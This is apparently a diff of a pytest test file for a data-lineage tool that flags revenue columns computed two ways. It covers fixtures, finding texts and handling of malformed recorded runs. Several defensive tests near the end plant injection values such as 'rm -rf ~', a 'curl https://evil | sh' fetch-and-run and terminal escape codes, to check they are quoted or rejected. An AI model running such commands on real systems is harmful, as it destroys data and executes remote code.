@@ -10,12 +10,28 @@ from pathlib import Path
 import pytest
 
 from konstruct import Project
-from konstruct.analysis.findings import TopFindings, top_findings
+from konstruct.analysis.findings import TopFindings, _declared, top_findings
 from konstruct.analysis.lock import lock as pin
 from konstruct.interfaces.cli import main
 
 from .test_conflict_data import FINANCE, SALES, make_shop
 from .test_lock import LTV, build, commit, repositories  # noqa: F401  (a fixture)
+
+# Revenue per customer, and the same without returned orders: a filter in front of an aggregate.
+SALES_TOTAL = """
+create table main.sales as
+select customer_id, sum(amount) / 100.0 as revenue
+from raw.orders
+group by customer_id
+"""
+FINANCE_TOTAL = """
+create table main.finance as
+select customer_id, sum(amount) / 100.0 as revenue
+from raw.orders
+where status <> 'returned'
+group by customer_id
+"""
+
 
 # The project says both columns are its revenue.
 REVENUE = """\
@@ -27,7 +43,7 @@ terms:
     approved: 2026-10-30
     columns: [sales.revenue, finance.revenue]
 """
-DECLARED = {'sales.sql': SALES, 'finance.sql': FINANCE, 'definitions.yml': REVENUE}
+DECLARED = {'sales.sql': SALES_TOTAL, 'finance.sql': FINANCE_TOTAL, 'definitions.yml': REVENUE}
 
 
 def findings(project: Project) -> TopFindings:
@@ -41,8 +57,8 @@ def kinds(result: TopFindings) -> dict[str, str]:
 def test_with_no_warehouse_and_no_definitions_the_findings_are_static(tmp_path: Path) -> None:
     """Acceptance: SQL files alone still give the widest reach, with a command that needs no data.
     Two columns a name alone links are no finding: the project has not said they are one number."""
-    (tmp_path / 'sales.sql').write_text(SALES)
-    (tmp_path / 'finance.sql').write_text(FINANCE)
+    (tmp_path / 'sales.sql').write_text(SALES_TOTAL)
+    (tmp_path / 'finance.sql').write_text(FINANCE_TOTAL)
     project = Project(tmp_path)
     project.build()
     assert len(project.conflicts().conflicts) == 1
@@ -56,14 +72,15 @@ def test_with_no_warehouse_and_no_definitions_the_findings_are_static(tmp_path: 
     project.build()
     found = kinds(findings(project))
     assert found['conflict'] == (
-        "finance.revenue and sales.revenue are both 'Revenue' in definitions.yml, but compute it two ways "
-        '(a filter only in finance.revenue); see what differs and where: `konstruct conflicts`'
+        "finance.revenue and sales.revenue are both 'Revenue' in definitions.yml, but compute it two ways: "
+        "finance.revenue counts only the rows where orders.status <> 'returned'; see every difference and its "
+        'file: `konstruct conflicts`'
     )
 
 
 def test_a_column_named_like_a_term_is_compared_with_the_one_bound_to_it(tmp_path: Path) -> None:
-    (tmp_path / 'sales.sql').write_text(SALES)
-    (tmp_path / 'finance.sql').write_text(FINANCE)
+    (tmp_path / 'sales.sql').write_text(SALES_TOTAL)
+    (tmp_path / 'finance.sql').write_text(FINANCE_TOTAL)
     (tmp_path / 'definitions.yml').write_text(
         REVENUE.replace('[sales.revenue, finance.revenue]', '[sales.revenue]')
     )
@@ -72,7 +89,7 @@ def test_a_column_named_like_a_term_is_compared_with_the_one_bound_to_it(tmp_pat
     [conflict] = [f for f in findings(project).findings if f.kind == 'conflict']
     assert conflict.text == (
         "sales.revenue is 'Revenue' in definitions.yml, and finance.revenue, named like it, computes it another "
-        'way (a filter only in finance.revenue)'
+        "way: finance.revenue counts only the rows where orders.status <> 'returned'"
     )
 
 
@@ -80,43 +97,133 @@ BOUND_REVENUE = """\
 version: 1
 terms:
   - name: Revenue
-    definition: Gross.
+    synonyms: [sales]
+    definition: What customers paid.
     status: approved
     approved: 2026-10-30
     columns: [orders_fct.revenue]
 """
-BOUND_ORDERS = 'create table main.orders_fct as select order_id, amount / 100.0 as revenue from raw.orders'
-NET_REVENUE = (
-    'create table main.net as select order_id, (amount - discount) / 100.0 as revenue from raw.orders'
+BOUND_ORDERS = (
+    'create table main.orders_fct as '
+    'select order_id, customer_id, order_date, amount / 100.0 as revenue from raw.orders'
 )
+# Columns named like Revenue or its synonym, beside the one bound to it, and whether the pair is a
+# conflict the project declares: only a likely measure conflict (`confident`) is.
+NAMED_LIKE_REVENUE = {
+    'rollup': (
+        "create table main.customer_month as select customer_id, date_trunc('month', order_date) as month, "
+        'sum(amount) / 100.0 as revenue from raw.orders group by 1, 2',
+        False,
+    ),
+    'rollup_of_bound': (
+        'create table main.customer_month as select customer_id, sum(revenue) as revenue '
+        'from main.orders_fct group by 1',
+        False,
+    ),
+    'subset': (
+        'create table main.completed_orders as select order_id, amount / 100.0 as revenue '
+        "from raw.orders where status = 'completed'",
+        False,
+    ),
+    'items': (
+        'create table main.product_sales as select product_id, sum(price * quantity) as revenue '
+        'from raw.order_items group by 1',
+        False,
+    ),
+    'synonym_count': (
+        'create table main.store_stats as select store_id, count(*) as sales from raw.orders group by 1',
+        False,
+    ),
+    'target': (
+        'create table main.targets as select month, target_amount * 1.0 as revenue from raw.budget',
+        False,
+    ),
+    'running': (
+        'create table main.running as select order_id, sum(amount / 100.0) over (order by order_date) '
+        'as revenue from raw.orders',
+        False,
+    ),
+    'other_source': (
+        'create table main.legacy as select order_id, amount_cents / 100.0 as revenue from raw.legacy_orders',
+        False,
+    ),
+    'subset_agg': (
+        'create table main.customer_completed as select customer_id, sum(amount) / 100.0 as revenue '
+        "from raw.orders where status = 'completed' group by 1",
+        True,
+    ),
+    'region_subset': (
+        'create table main.eu_orders as select order_id, amount / 100.0 as revenue '
+        "from raw.orders where region = 'EU'",
+        False,
+    ),
+    'net': (
+        'create table main.net as select order_id, (amount - discount) / 100.0 as revenue from raw.orders',
+        True,
+    ),
+    'usd': (
+        'create table main.usd as select o.order_id, o.amount / 100.0 * fx.rate as revenue '
+        'from raw.orders o join raw.fx fx on fx.currency = o.currency',
+        True,
+    ),
+    'units': (
+        'create table main.product_units as select product_id, sum(quantity) as sales '
+        'from raw.order_items group by 1',
+        False,
+    ),
+}
+
+
+@pytest.mark.parametrize('case', sorted(NAMED_LIKE_REVENUE))
+def test_a_column_named_like_a_term_is_one_only_as_a_likely_measure_conflict(
+    tmp_path: Path, case: str
+) -> None:
+    """A roll-up, a running total, a subset, a count named for a synonym and an amount of another
+    table share the term's name and differ on purpose: with one column bound to the term, the other
+    is a conflict the project declares only when the two are a likely measure conflict."""
+    sql, declared = NAMED_LIKE_REVENUE[case]
+    (tmp_path / 'orders.sql').write_text(BOUND_ORDERS)
+    (tmp_path / 'm.sql').write_text(sql)
+    (tmp_path / 'definitions.yml').write_text(BOUND_REVENUE)
+    project = Project(tmp_path)
+    project.build()
+    likely = [c for c in project.conflicts().conflicts if c.kind == 'measure' and c.confident]
+    conflicts = [f for f in findings(project).findings if f.kind == 'conflict']
+    assert bool(conflicts) == declared == bool(likely)
+    if declared:
+        assert conflicts[0].text.startswith("orders_fct.revenue is 'Revenue' in definitions.yml, and ")
 
 
 def test_a_column_bound_to_another_term_is_not_named_like_this_one(tmp_path: Path) -> None:
     """Revenue and Net revenue are two terms, each bound to its own column: the project says the
     two are different numbers, so their columns are no conflict, whatever their names share."""
     (tmp_path / 'orders.sql').write_text(BOUND_ORDERS)
-    (tmp_path / 'net.sql').write_text(NET_REVENUE)
+    (tmp_path / 'net.sql').write_text(NAMED_LIKE_REVENUE['net'][0])
     (tmp_path / 'definitions.yml').write_text(BOUND_REVENUE)
     project = Project(tmp_path)
     project.build()
     assert 'conflict' in kinds(findings(project))
     (tmp_path / 'definitions.yml').write_text(
-        BOUND_REVENUE
-        + textwrap.indent(
-            textwrap.dedent(
-                """\
-                - name: Net revenue
-                  definition: After discounts.
-                  status: approved
-                  approved: 2026-10-30
-                  columns: [net.revenue]
-                """
-            ),
-            '  ',
+        textwrap.dedent(
+            """\
+            version: 1
+            terms:
+              - name: Revenue
+                definition: Gross.
+                status: approved
+                approved: 2026-10-30
+                columns: [orders_fct.revenue]
+              - name: Net revenue
+                definition: After discounts.
+                status: approved
+                approved: 2026-10-30
+                columns: [net.revenue]
+            """
         )
     )
     project.build()
-    assert len(project.conflicts().conflicts) == 1
+    [pair] = project.conflicts().conflicts
+    assert pair.kind == 'measure' and pair.confident
     assert 'conflict' not in kinds(findings(project))
 
 
@@ -125,7 +232,7 @@ def test_with_a_warehouse_the_findings_lead_to_the_data(tmp_path: Path) -> None:
     found = kinds(findings(project))
     assert found['conflict'].endswith('compare them on the data: `konstruct verify --conflicts`')
     assert found['claim'] == (
-        'the lineage claims 6 column edges, none yet checked against the data; check each one by '
+        'the lineage claims 4 column edges, none yet checked against the data; check each one by '
         'rerunning the models: `konstruct verify`'
     )
     assert list(found) == ['conflict', 'claim', 'reach']
@@ -136,11 +243,12 @@ def test_after_verify_conflicts_the_conflict_says_how_the_two_differ_on_the_data
     project.verify_conflicts()
     [conflict] = [f for f in findings(project).findings if f.kind == 'conflict']
     assert conflict.text == (
-        "finance.revenue and sales.revenue are both 'Revenue' in definitions.yml, but compute it two ways, and "
-        'differ on the data: 2 rows of order_id only in sales.revenue; totals 29 and 94, 65 apart (224.1% of '
+        "finance.revenue and sales.revenue are both 'Revenue' in definitions.yml, but compute it two ways: "
+        "finance.revenue counts only the rows where orders.status <> 'returned'; on the data, they give "
+        'different values for 2 of the 3 customer_id values both have; totals 29 and 94, 65 apart (224.1% of '
         'the first)'
     )
-    assert conflict.command == 'konstruct verify --why finance.revenue --where order_id=4'
+    assert conflict.command.startswith('konstruct verify --why finance.revenue --where customer_id=')
     # A result for other formulas than the graph's now is not this pair's.
     path = project.out_dir / 'conflict_data.json'
     data = json.loads(path.read_text())
@@ -155,7 +263,7 @@ def test_a_pair_that_agrees_on_the_data_says_so(tmp_path: Path) -> None:
     project = make_shop(tmp_path / 'shop', DECLARED, orders)
     project.verify_conflicts()
     [conflict] = [f for f in findings(project).findings if f.kind == 'conflict']
-    assert 'but agree on the data' in conflict.text and conflict.command == 'konstruct conflicts'
+    assert conflict.text.endswith('; they agree on the data') and conflict.command == 'konstruct conflicts'
 
 
 def test_what_verify_found_wrong_is_a_claim_finding(tmp_path: Path) -> None:
@@ -258,9 +366,11 @@ def test_a_verify_report_of_the_wrong_shape_is_passed_over(tmp_path: Path, repor
     other finding is still made."""
     project = make_shop(tmp_path / 'shop', DECLARED)
     (project.out_dir / 'verify.json').write_text(report if isinstance(report, str) else json.dumps(report))
+    result = findings(project)
     # A report of the wrong shape says nothing; one that cannot be read at all is as none.
     expected = ['conflict', 'claim', 'reach'] if isinstance(report, str) else ['conflict', 'reach']
-    assert [f.kind for f in findings(project).findings] == expected
+    assert [f.kind for f in result.findings] == expected and not result.notes
+    assert project.findings().to_dict() == result.to_dict()
 
 
 def test_an_approved_term_naming_a_column_no_longer_built(tmp_path: Path) -> None:
@@ -314,6 +424,15 @@ def test_no_definition_finding_when_dbt_was_not_read(tmp_path: Path) -> None:
     project.build(run_dbt=False)
     assert any(s.get('input') == 'dbt' and 'status' in s for s in project.graph.meta['sources'])
     assert 'definition' not in kinds(findings(project))
+
+
+def test_a_malformed_record_of_the_sources_never_fails_the_findings(tmp_path: Path) -> None:
+    """graph.json is a file on disk: a record of its sources written by hand is a note, never an error."""
+    project = make_shop(tmp_path / 'shop', DECLARED)
+    project.graph.meta['sources'] = ['duckdb', 7]
+    result = findings(project)
+    assert any('could not be made' in note for note in result.notes)
+    assert 'reach' in kinds(result)
 
 
 @pytest.mark.usefixtures('trust_config')
@@ -373,15 +492,54 @@ def test_the_example_leads_with_its_conflict_and_its_dashboard(
     found = kinds(findings(project))
     assert found['conflict'].startswith(
         "orders.amount is 'Order amount' in definitions.yml, and finance_orders.order_value, named like it, "
-        'computes it another way (a filter only in finance_orders.order_value'
+        'computes it another way: finance_orders.order_value counts only the rows where'
     )
     assert found['reach'].startswith(
         'a change to raw_payments.amount reaches 1 exposure (customer_dashboard)'
     )
     project.verify_conflicts()
     found = kinds(findings(project))
-    assert 'differ on the data: 6 rows of order_id only in orders.amount' in found['conflict']
+    assert 'on the data, 6 rows of order_id only in orders.amount' in found['conflict']
     assert '`konstruct verify --why finance_orders.order_value --where order_id=' in found['conflict']
+
+
+STUDY_TERMS = """\
+version: 1
+terms:
+  - name: Order revenue
+    definition: What customers paid for an order.
+    columns: [order_revenue.revenue, item_revenue.revenue]
+  - name: Expenses
+    definition: What was spent.
+    columns: [expenses.total_expenses, department_expenses.total_expenses]
+  - name: Order count
+    definition: How many orders there were.
+    columns: [delivered.order_count, order_stats.order_count]
+  - name: Margin
+    definition: The share of revenue kept after cost.
+    columns: [product_margin.margin, margin.margin]
+"""
+
+
+def test_the_findings_name_only_the_pairs_the_project_binds_to_one_term(tmp_path: Path) -> None:
+    """Five pairs of the study are one number computed twice, but a name is all that links them:
+    none is a finding until the project's terms bind them, and then at most three are, the most
+    consequential first."""
+    from .test_conflicts import NOISE_MODELS, NOISE_TABLES, STUDY_MODELS, STUDY_TABLES
+    from .test_conflicts import make_project as make_conflicts
+
+    study = make_conflicts(tmp_path / 'study', STUDY_TABLES, STUDY_MODELS)
+    assert len(study.conflicts().measures) == 5
+    assert 'conflict' not in kinds(findings(study))
+    bound = make_conflicts(tmp_path / 'bound', STUDY_TABLES, {**STUDY_MODELS, 'definitions.yml': STUDY_TERMS})
+    conflicts = [f for f in findings(bound).findings if f.kind == 'conflict']
+    named = {frozenset(f.subjects) for f in conflicts}
+    declared = [c for c in bound.conflicts().conflicts if _declared(bound.graph, c)]
+    assert len(conflicts) == 3 and len(declared) == 4
+    assert named == {frozenset((c.a.label, c.b.label)) for c in declared[:3]}
+    assert conflicts[-1].text.endswith('(1 more such pair)')
+    noise = make_conflicts(tmp_path / 'noise', NOISE_TABLES, NOISE_MODELS)
+    assert 'conflict' not in kinds(findings(noise))
 
 
 def test_the_reach_is_of_the_projects_own_columns_and_leads_with_exposures(tmp_path: Path) -> None:
@@ -464,15 +622,154 @@ def test_seeds_and_an_empty_warehouse_do_not_advertise_verify(tmp_path: Path) ->
 
 def test_a_planted_recorded_run_cannot_inject_a_command(tmp_path: Path) -> None:
     """conflict_data.json is a file in the project: the columns a finding names are the conflict's
-    own, and the key and value it reads from the file are quoted."""
+    own, a key value must be one the key column can hold, and the key and value it reads from the
+    file are quoted."""
+    from konstruct.analysis.conflict_data import ExampleRow, PairOnData
+
     project = make_shop(tmp_path / 'shop', DECLARED)
     project.verify_conflicts()
     path = project.out_dir / 'conflict_data.json'
     data = json.loads(path.read_text())
     entry = data['pairs'][0]
     entry['a'] = 'x; rm -rf ~'
-    entry['examples'][0]['key'] = '23 && curl https://evil | sh'
     path.write_text(json.dumps(data))
     [finding] = [f for f in findings(project).findings if f.kind == 'conflict']
-    assert finding.command.endswith("--where 'order_id=23 && curl https://evil | sh'")
-    assert 'rm -rf' not in finding.line()
+    assert 'on the data' in finding.text and 'rm -rf' not in finding.line()
+    # customer_id holds integers: free text is no value of it, and a key of hundreds of digits no row's.
+    for planted in ('23 && curl https://evil | sh', '9' * 300, 10**300, True):
+        entry['examples'][0]['key'] = planted
+        path.write_text(json.dumps(data))
+        [finding] = [f for f in findings(project).findings if f.kind == 'conflict']
+        assert 'on the data' not in finding.text and finding.command == 'konstruct conflicts'
+    # Where the key holds text, the value is quoted in the command.
+    pair = PairOnData('Revenue', 'a.revenue', 'b.revenue', key='code', examples=[ExampleRow('7; ls', 1, 2)])
+    assert pair.next_command() == "konstruct verify --why a.revenue --where 'code=7; ls'"
+
+
+@pytest.mark.parametrize(
+    ('family', 'value', 'taken'),
+    [
+        ('integer', 23, True),
+        ('integer', '23', False),
+        ('integer', 2.5, False),
+        ('integer', False, False),
+        ('number', 2.5, True),
+        ('number', 'NaN', False),
+        ('boolean', True, True),
+        ('boolean', 1, False),
+        ('time', '2026-11-26', True),
+        ('time', '2026-11-26T10:00:00', True),
+        ('time', 'yesterday; rm -rf ~', False),
+        (None, 'ORD-0042', True),
+        (None, 'x' * 201, False),
+        (None, None, False),
+        (None, float('inf'), False),
+    ],
+)
+def test_a_key_value_must_be_one_its_column_can_hold(family: str | None, value: object, taken: bool) -> None:
+    from konstruct.analysis.findings import _key_value
+
+    assert _key_value(value, family) is taken
+
+
+@pytest.mark.parametrize(
+    'document',
+    [
+        'not json',
+        '[1, 2]',
+        '{"format_version": 99, "pairs": []}',
+        '{"format_version": -1, "pairs": []}',
+        '{"format_version": 1.0, "pairs": []}',
+        '{"pairs": 7}',
+        '[' * 100_000 + ']' * 100_000,
+        '{"pairs": [{"a_column": 3}]}',
+    ],
+)
+def test_a_malformed_or_newer_recorded_run_never_fails_the_findings(tmp_path: Path, document: str) -> None:
+    project = make_shop(tmp_path / 'shop', DECLARED)
+    (project.out_dir / 'conflict_data.json').write_text(document)
+    result = findings(project)
+    assert next(f.kind for f in result.findings) == 'conflict'
+    if not document.startswith('{"pairs": ['):
+        assert result.notes and 'conflict_data.json' in result.notes[0]
+
+
+def test_a_recorded_run_with_fields_of_the_wrong_type_is_left_out(tmp_path: Path) -> None:
+    project = make_shop(tmp_path / 'shop', DECLARED)
+    project.verify_conflicts()
+    path = project.out_dir / 'conflict_data.json'
+    data = json.loads(path.read_text())
+    data['pairs'][0]['differ'] = 'many'
+    data['pairs'][0]['examples'][0]['key'] = {'nested': True}
+    path.write_text(json.dumps(data))
+    [conflict] = [f for f in findings(project).findings if f.kind == 'conflict']
+    assert 'on the data' not in conflict.text
+
+
+def test_a_pair_the_last_run_could_not_run_is_not_offered_again(tmp_path: Path) -> None:
+    project = make_shop(tmp_path / 'shop', DECLARED)
+    project.verify_conflicts()
+    path = project.out_dir / 'conflict_data.json'
+    data = json.loads(path.read_text())
+    data['pairs'][0]['skipped'] = 'cannot read shop.raw.orders'
+    path.write_text(json.dumps(data))
+    [conflict] = [f for f in findings(project).findings if f.kind == 'conflict']
+    assert conflict.command == 'konstruct conflicts'
+
+
+def test_an_error_in_the_findings_never_fails_the_build(
+    tmp_path: Path, capsys: pytest.CaptureFixture[str], monkeypatch: pytest.MonkeyPatch
+) -> None:
+    import konstruct.analysis.findings as module
+
+    def broken(*args: object, **kwargs: object) -> None:
+        raise RuntimeError('boom')
+
+    for name, sql in DECLARED.items():
+        (tmp_path / name).write_text(sql)
+    monkeypatch.setattr(module, '_reach', broken)
+    assert main(['--no-color', 'build', str(tmp_path)]) == 0
+    out = capsys.readouterr().out
+    assert 'the reach findings could not be made: RuntimeError: boom' in out
+    assert '\nFindings\n  conflict  finance.revenue and sales.revenue' in out
+    result = Project(tmp_path).findings()
+    assert [f.kind for f in result.findings] == ['conflict'] and 'RuntimeError: boom' in result.notes[0]
+
+
+@pytest.mark.parametrize(
+    ('field', 'value'),
+    [
+        ('key', 'status'),  # a column of neither side
+        ('key', 'customer_id' * 30),
+        ('differ', -1),
+        ('matched', 2.5),
+        ('total_a', float('nan')),
+        ('total_b', float('inf')),
+    ],
+)
+def test_a_recorded_run_with_a_value_it_cannot_have_is_left_out(
+    tmp_path: Path, field: str, value: object
+) -> None:
+    project = make_shop(tmp_path / 'shop', DECLARED)
+    project.verify_conflicts()
+    path = project.out_dir / 'conflict_data.json'
+    data = json.loads(path.read_text())
+    data['pairs'][0][field] = value
+    path.write_text(json.dumps(data))
+    [conflict] = [f for f in findings(project).findings if f.kind == 'conflict']
+    assert 'on the data' not in conflict.text and conflict.command == 'konstruct conflicts'
+
+
+def test_text_read_from_a_recorded_run_cannot_move_the_terminal(tmp_path: Path) -> None:
+    project = make_shop(tmp_path / 'shop', DECLARED)
+    project.verify_conflicts()
+    path = project.out_dir / 'conflict_data.json'
+    data = json.loads(path.read_text())
+    data['pairs'][0]['examples'][0]['key'] = '23\x1b[2J\nwarning'
+    path.write_text(json.dumps(data))
+    shown = str(findings(project))
+    assert '\x1b' not in shown and '[2J' not in shown  # no value of the integer key column
+    # A key that is no column of both sides is not taken at all.
+    data['pairs'][0]['key'] = 'customer_id\x1b[2J'
+    path.write_text(json.dumps(data))
+    assert '[2J' not in str(findings(project))
